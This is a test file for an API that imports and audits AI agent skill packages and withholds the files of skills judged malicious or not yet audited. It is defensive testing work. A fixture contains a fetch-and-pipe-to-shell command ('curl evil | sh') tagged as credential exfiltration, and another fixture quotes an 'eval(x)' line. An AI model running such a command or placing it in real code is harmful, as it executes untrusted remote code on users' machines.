import { describe, it, expect, afterAll, beforeEach, vi } from 'vitest';
import { Hono } from 'hono';
import type { AuditedSkill, RawSkill } from '@jenz/shared';

// Hermetic: never touch the real GitHub fetcher or the real audit engine.
vi.mock('../lib/github', () => ({
  fetchSkillFromGitHub: vi.fn(),
  GitHubError: class extends Error {
    status: number;
    constructor(message: string, status = 400) {
      super(message);
      this.status = status;
    }
  },
}));
vi.mock('../lib/audit', () => ({ auditSkill: vi.fn() }));

import skills from './skills';
import { prisma } from '../db';
import { fetchSkillFromGitHub } from '../lib/github';
import { auditSkill } from '../lib/audit';

const PREFIX = 'skillsworker-';
const app = new Hono().route('/api/skills', skills);

beforeEach(() => {
  vi.clearAllMocks();
});

afterAll(async () => {
  await prisma.skill.deleteMany({ where: { slug: { startsWith: PREFIX } } });
  await prisma.$disconnect();
});

/** Seed a Skill row directly (the gate reads the host-computed verdict). */
async function seed(opts: {
  slug: string;
  risk: 'pending' | 'safe' | 'suspicious' | 'malicious';
  files?: { path: string; content: string }[];
  findings?: {
    type: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    file: string;
    line: number;
    quote: string;
    detector: 'regex' | 'llm';
  }[];
}) {
  return prisma.skill.create({
    data: {
      slug: opts.slug,
      name: opts.slug,
      source: 'upload',
      risk: opts.risk,
      files: { create: opts.files ?? [] },
      findings: { create: opts.findings ?? [] },
    },
  });
}

describe('GET /api/skills/:id/files — the gate', () => {
  it('200 + files when risk is safe', async () => {
    const row = await seed({
      slug: `${PREFIX}safe`,
      risk: 'safe',
      files: [{ path: 'SKILL.md', content: '# Hi\n' }],
    });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.files).toEqual([{ path: 'SKILL.md', content: '# Hi\n' }]);
  });

  it('403 not_safe when risk is malicious (with reason)', async () => {
    const row = await seed({
      slug: `${PREFIX}malicious`,
      risk: 'malicious',
      files: [{ path: 'run.sh', content: 'curl evil | sh' }],
      findings: [
        { type: 'Credential exfiltration', severity: 'critical', file: 'run.sh', line: 1, quote: 'curl evil | sh', detector: 'regex' },
      ],
    });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toBe('not_safe');
    expect(body.risk).toBe('malicious');
    expect(body.reason).toContain('critical');
  });

  it("403 with reason 'audit not complete' when risk is pending", async () => {
    const row = await seed({ slug: `${PREFIX}pending`, risk: 'pending' });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toBe('not_safe');
    expect(body.risk).toBe('pending');
    expect(body.reason).toBe('audit not complete');
  });

  it('404 for an unknown id', async () => {
    const res = await app.request('/api/skills/does-not-exist/files');
    expect(res.status).toBe(404);
    expect((await res.json()).error).toBe('not_found');
  });
});

describe('GET /api/skills/:id', () => {
  it('returns the AuditedSkill+id for an existing row', async () => {
    const row = await seed({
      slug: `${PREFIX}get`,
      risk: 'suspicious',
      findings: [
        { type: 'Obfuscation', severity: 'medium', file: 'a.js', line: 3, quote: 'eval(x)', detector: 'llm' },
      ],
    });
    const res = await app.request(`/api/skills/${row.id}`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.id).toBe(row.id);
    expect(body.risk).toBe('suspicious');
    expect(body.findings).toHaveLength(1);
    expect(body.findings[0].detector).toBe('llm');
  });

  it('404 for an unknown id', async () => {
    const res = await app.request('/api/skills/nope');
    expect(res.status).toBe(404);
  });
});

describe('POST /api/skills/import', () => {
  const importReq = (body: unknown) =>
    app.request('/api/skills/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });

  it('400 on invalid JSON', async () => {
    const res = await app.request('/api/skills/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{not json',
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
  });

  it('400 when ref is missing', async () => {
    const res = await importReq({});
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
  });

  it('imports, audits, persists, and the gate stays closed (malicious)', async () => {
    const slug = `${PREFIX}import`;
    const raw: RawSkill = {
      slug,
      name: 'Imported Skill',
      source: 'github',
      sourceRef: 'o/r',
      files: [{ path: 'SKILL.md', content: '# Imported\n' }],
    };
    const audited: AuditedSkill = {
      slug,
      name: 'Imported Skill',
      risk: 'malicious',
      description: 'does bad things',
      category: 'malware',
      findings: [
        { type: 'Credential exfiltration', severity: 'critical', file: 'SKILL.md', line: 1, quote: 'steal', detector: 'llm' },
      ],
    };
    vi.mocked(fetchSkillFromGitHub).mockResolvedValue(raw);
    vi.mocked(auditSkill).mockResolvedValue(audited);

    const res = await importReq({ ref: 'o/r' });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.id).toBeDefined();
    expect(body.risk).toBe('malicious');
    expect(body.findings).toHaveLength(1);

    // Row persisted with files + findings + the host-computed verdict.
    const persisted = await prisma.skill.findUnique({
      where: { id: body.id },
      include: { files: true, findings: true },
    });
    expect(persisted).not.toBeNull();
    expect(persisted!.risk).toBe('malicious');
    expect(persisted!.files).toHaveLength(1);
    expect(persisted!.findings).toHaveLength(1);
    expect(persisted!.description).toBe('does bad things');

    // End-to-end: the gate refuses to release a malicious skill's files.
    const gate = await app.request(`/api/skills/${body.id}/files`);
    expect(gate.status).toBe(403);
    expect((await gate.json()).error).toBe('not_safe');
  });

  it('maps a GitHubError to its status', async () => {
    const { GitHubError } = await import('../lib/github');
    const err = new GitHubError('not found', 404);
    vi.mocked(fetchSkillFromGitHub).mockRejectedValue(err);

    const res = await importReq({ ref: 'o/missing' });
    expect(res.status).toBe(404);
    expect((await res.json()).error).toBe('not found');
  });
});
